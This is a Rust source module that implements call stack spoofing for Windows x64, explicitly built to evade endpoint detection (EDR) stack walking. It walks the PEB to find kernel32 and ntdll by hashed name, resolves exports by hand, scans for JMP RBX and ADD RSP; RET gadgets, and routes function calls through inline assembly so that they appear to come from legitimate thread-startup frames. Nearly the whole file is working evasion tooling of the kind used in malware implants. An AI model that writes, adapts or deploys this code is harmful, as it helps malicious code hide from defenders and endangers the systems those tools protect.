#![allow(non_snake_case)]
#![allow(dead_code)]

//! # Call Stack Spoofing (Synthetic Frames) - Enhanced
//!
//! Creates synthetic call frames to evade EDR stack walking.
//! Makes syscalls appear to come from legitimate code paths.
//!
//! ## Techniques
//! - **Dynamic Resolution**: Resolve BaseThreadInitThunk/RtlUserThreadStart at runtime
//! - **Synthetic Frames**: Build synthetic stack mimicking Windows thread startup
//! - **Gadget Hunting**: Find JMP/ADD RSP gadgets for control flow
//!
//! ## Goal
//! Replace: [Private Memory] → ntdll
//! With:    kernel32!BaseThreadInitThunk → ntdll!RtlUserThreadStart

use std::ffi::c_void;
use std::sync::atomic::{AtomicPtr, Ordering};
use std::ptr;


// Cached resolved addresses (using AtomicPtr for thread safety)
static KERNEL32_BASE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
static NTDLL_BASE: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
static BASE_THREAD_INIT: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
static RTL_USER_THREAD_START: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
static JMP_RBX_GADGET: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());
static ADD_RSP_RET_GADGET: AtomicPtr<c_void> = AtomicPtr::new(ptr::null_mut());

// ============================================================================
// DYNAMIC RESOLUTION
// ============================================================================

/// Get kernel32.dll base via PEB walking
#[cfg(target_arch = "x86_64")]
pub unsafe fn get_kernel32_base() -> Option<*const c_void> {
    let cached = KERNEL32_BASE.load(Ordering::Relaxed);
    if !cached.is_null() {
        return Some(cached);
    }
    
    let base = find_module_by_hash(0x3E003875)?; // kernel32.dll (verified)
    KERNEL32_BASE.store(base as *mut c_void, Ordering::Relaxed);
    Some(base)
}

/// Get ntdll.dll base via PEB walking
/// NOTE: Using hash lookup instead of assuming position - more robust!
#[cfg(target_arch = "x86_64")]
pub unsafe fn get_ntdll_base() -> Option<*const c_void> {
    let cached = NTDLL_BASE.load(Ordering::Relaxed);
    if !cached.is_null() {
        return Some(cached);
    }
    
    // DJB2 hash for "ntdll.dll" (case-insensitive)
    // 'n'=0x6E, 't'=0x74, 'd'=0x64, 'l'=0x6C, 'l'=0x6C, '.'=0x2E, 'd'=0x64, 'l'=0x6C, 'l'=0x6C
    const NTDLL_HASH: u32 = 0xE91AAD51; // ntdll.dll (verified)
    
    let base = find_module_by_hash(NTDLL_HASH)?;
    NTDLL_BASE.store(base as *mut c_void, Ordering::Relaxed);
    Some(base)
}

/// Find module by DJB2 hash of name
#[cfg(target_arch = "x86_64")]
unsafe fn find_module_by_hash(target_hash: u32) -> Option<*const c_void> {
    let peb: *const u8;
    std::arch::asm!("mov {}, gs:[0x60]", out(reg) peb, options(nostack, pure, readonly));
    
    let ldr = *(peb.add(0x18) as *const *const u8);
    let list_head = ldr.add(0x20);
    let mut entry = *(list_head as *const *const u8);
    let head = entry;
    
    while !entry.is_null() {
        let base = *((entry as usize + 0x20) as *const *const c_void);
        let name_ptr = *((entry as usize + 0x50) as *const *const u16);
        let name_len = *((entry as usize + 0x48) as *const u16) as usize / 2;
        
        if !name_ptr.is_null() && name_len > 0 {
            let hash = djb2_wide(name_ptr, name_len);
            if hash == target_hash {
                return Some(base);
            }
        }
        
        entry = *(entry as *const *const u8);
        if entry == head { break; }
    }
    None
}

/// DJB2 hash for wide string (case-insensitive)
fn djb2_wide(s: *const u16, len: usize) -> u32 {
    let mut hash: u32 = 5381;
    for i in 0..len {
        let c = unsafe { *s.add(i) } as u32;
        let c_lower = if c >= 65 && c <= 90 { c + 32 } else { c };
        hash = hash.wrapping_shl(5).wrapping_add(hash) ^ c_lower;
    }
    hash
}

/// Resolve export by name from module
#[cfg(target_arch = "x86_64")]
pub unsafe fn get_export_address(module: *const c_void, name: &[u8]) -> Option<*const c_void> {
    let dos = module as *const u8;
    if *(dos as *const u16) != 0x5A4D { return None; }
    
    let e_lfanew = *((dos as usize + 0x3C) as *const i32);
    let nt = dos.add(e_lfanew as usize);
    
    let export_rva = *((nt as usize + 0x88) as *const u32);
    if export_rva == 0 { return None; }
    
    let export = dos.add(export_rva as usize);
    let num_names = *((export as usize + 0x18) as *const u32);
    let names_rva = *((export as usize + 0x20) as *const u32);
    let funcs_rva = *((export as usize + 0x1C) as *const u32);
    let ords_rva = *((export as usize + 0x24) as *const u32);
    
    let names = dos.add(names_rva as usize) as *const u32;
    let funcs = dos.add(funcs_rva as usize) as *const u32;
    let ords = dos.add(ords_rva as usize) as *const u16;
    
    for i in 0..num_names {
        let name_ptr = dos.add(*names.add(i as usize) as usize);
        if strcmp(name_ptr, name) {
            let ord = *ords.add(i as usize);
            let func_rva = *funcs.add(ord as usize);
            return Some(dos.add(func_rva as usize) as *const c_void);
        }
    }
    None
}

fn strcmp(a: *const u8, b: &[u8]) -> bool {
    for (i, &c) in b.iter().enumerate() {
        if c == 0 { return unsafe { *a.add(i) } == 0; }
        if unsafe { *a.add(i) } != c { return false; }
    }
    true
}

/// Resolve and cache BaseThreadInitThunk address
pub unsafe fn get_base_thread_init() -> Option<*const c_void> {
    let cached = BASE_THREAD_INIT.load(Ordering::Relaxed);
    if !cached.is_null() {
        return Some(cached);
    }
    
    let kernel32 = get_kernel32_base()?;
    let addr = get_export_address(kernel32, b"BaseThreadInitThunk\0")?;
    BASE_THREAD_INIT.store(addr as *mut c_void, Ordering::Relaxed);

    Some(addr)
}

/// Resolve and cache RtlUserThreadStart address
pub unsafe fn get_rtl_user_thread_start() -> Option<*const c_void> {
    let cached = RTL_USER_THREAD_START.load(Ordering::Relaxed);
    if !cached.is_null() {
        return Some(cached);
    }
    
    let ntdll = get_ntdll_base()?;
    let addr = get_export_address(ntdll, b"RtlUserThreadStart\0")?;
    RTL_USER_THREAD_START.store(addr as *mut c_void, Ordering::Relaxed);

    Some(addr)
}

// ============================================================================
// GADGET HUNTING
// ============================================================================

/// Find a `JMP RBX` gadget in module (0xFF 0xE3)
pub unsafe fn find_jmp_rbx_gadget(module_base: *const c_void) -> Option<*const c_void> {
    find_gadget(module_base, &[0xFF, 0xE3])
}

/// Find an `ADD RSP, offset; RET` gadget
pub unsafe fn find_add_rsp_ret_gadget(module_base: *const c_void, offset: u8) -> Option<*const c_void> {
    // ADD RSP, X = 48 83 C4 XX
    // RET = C3
    find_gadget(module_base, &[0x48, 0x83, 0xC4, offset, 0xC3])
}

/// Find gadget pattern in module
unsafe fn find_gadget(module_base: *const c_void, pattern: &[u8]) -> Option<*const c_void> {
    let dos = module_base as *const u16;
    if *dos != 0x5A4D { return None; }
    
    let e_lfanew = *((module_base as usize + 0x3C) as *const i32);
    let nt = (module_base as usize + e_lfanew as usize) as *const u8;
    let size_of_image = *((nt as usize + 0x50) as *const u32) as usize;
    
    let base = module_base as *const u8;
    for i in 0..size_of_image.saturating_sub(pattern.len()) {
        let mut found = true;
        for (j, &b) in pattern.iter().enumerate() {
            if *base.add(i + j) != b {
                found = false;
                break;
            }
        }
        if found {
            return Some(base.add(i) as *const c_void);
        }
    }
    None
}

/// Get cached JMP RBX gadget in kernel32
pub unsafe fn get_jmp_rbx_gadget() -> Option<*const c_void> {
    let cached = JMP_RBX_GADGET.load(Ordering::Relaxed);
    if !cached.is_null() {
        return Some(cached);
    }
    
    let kernel32 = get_kernel32_base()?;
    let gadget = find_jmp_rbx_gadget(kernel32)?;
    JMP_RBX_GADGET.store(gadget as *mut c_void, Ordering::Relaxed);

    Some(gadget)
}

/// Get ADD RSP, 0x38; RET gadget in ntdll (for syscall return spoofing)
pub unsafe fn get_add_rsp_ret_gadget() -> Option<*const c_void> {
    let cached = ADD_RSP_RET_GADGET.load(Ordering::Relaxed);
    if !cached.is_null() {
        return Some(cached);
    }
    
    let ntdll = get_ntdll_base()?;
    // Try common stack adjustments
    for offset in [0x38u8, 0x48, 0x28, 0x58, 0x68] {
        if let Some(gadget) = find_add_rsp_ret_gadget(ntdll, offset) {
            ADD_RSP_RET_GADGET.store(gadget as *mut c_void, Ordering::Relaxed);

            return Some(gadget);
        }
    }
    None
}

// ============================================================================
// INTEGRATION HELPERS
// ============================================================================

/// Initialize all spoof infrastructure (call once at startup)
pub unsafe fn init_spoofing() -> bool {

    
    let k32 = get_kernel32_base();
    let ntdll = get_ntdll_base();
    let bti = get_base_thread_init();
    let ruts = get_rtl_user_thread_start();
    let jmp = get_jmp_rbx_gadget();
    let add_rsp = get_add_rsp_ret_gadget();
    
    if k32.is_some() && ntdll.is_some() && bti.is_some() && ruts.is_some() && jmp.is_some() {

        true
    } else {

        false
    }
}

/// Build a spoofed stack frame for sleep operations  
/// Returns (new_rsp, cleanup function to restore)
#[cfg(target_arch = "x86_64")]
pub unsafe fn prepare_spoofed_sleep() -> Option<SpoofedSleepContext> {
    let bti = get_base_thread_init()?;
    let ruts = get_rtl_user_thread_start()?;
    
    Some(SpoofedSleepContext {
        base_thread_init: bti,
        rtl_user_thread_start: ruts,
    })
}

/// Context for spoofed sleep
#[repr(C)]
pub struct SpoofedSleepContext {
    pub base_thread_init: *const c_void,
    pub rtl_user_thread_start: *const c_void,
}

/// Get spoofed return address for syscalls (inside kernel32)
pub unsafe fn get_spoofed_return_addr() -> Option<*const c_void> {
    // Return address should point to a benign location in kernel32
    // We use BaseThreadInitThunk + small offset (inside the function)
    let bti = get_base_thread_init()?;
    Some((bti as usize + 0x14) as *const c_void) // Offset into function body
}

// ============================================================================
// SPOOFED CALL EXECUTOR
// ============================================================================

/// Execute a function with spoofed call stack
#[cfg(target_arch = "x86_64")]
pub unsafe fn spoofed_call(
    target: *const c_void,
    jmp_rbx_gadget: *const c_void,
    args: &[usize],
) -> usize {
    let result: usize;
    
    let a1 = args.get(0).copied().unwrap_or(0);
    let a2 = args.get(1).copied().unwrap_or(0);
    let a3 = args.get(2).copied().unwrap_or(0);
    let a4 = args.get(3).copied().unwrap_or(0);
    
    std::arch::asm!(
        // Save callee-saved register
        "push rbx",
        
        // RBX = target function
        "mov rbx, {target}",
        
        // Set up args
        "mov rcx, {a1}",
        "mov rdx, {a2}",
        "mov r8, {a3}",
        "mov r9, {a4}",
        
        // Shadow space
        "sub rsp, 32",
        
        // Call via gadget (JMP RBX inside ntdll/kernel32)
        "call {gadget}",
        
        // Cleanup
        "add rsp, 32",
        "pop rbx",
        
        target = in(reg) target,
        gadget = in(reg) jmp_rbx_gadget,
        a1 = in(reg) a1,
        a2 = in(reg) a2,
        a3 = in(reg) a3,
        a4 = in(reg) a4,
        lateout("rax") result,
        clobber_abi("system"),
    );
    

    result
}

#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn spoofed_call(
    _target: *const c_void,
    _jmp_rbx_gadget: *const c_void,
    _args: &[usize],
) -> usize {
    0
}

#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn get_kernel32_base() -> Option<*const c_void> { None }
#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn get_ntdll_base() -> Option<*const c_void> { None }
#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn get_export_address(_: *const c_void, _: &[u8]) -> Option<*const c_void> { None }
#[cfg(not(target_arch = "x86_64"))]
pub unsafe fn prepare_spoofed_sleep() -> Option<SpoofedSleepContext> { None }

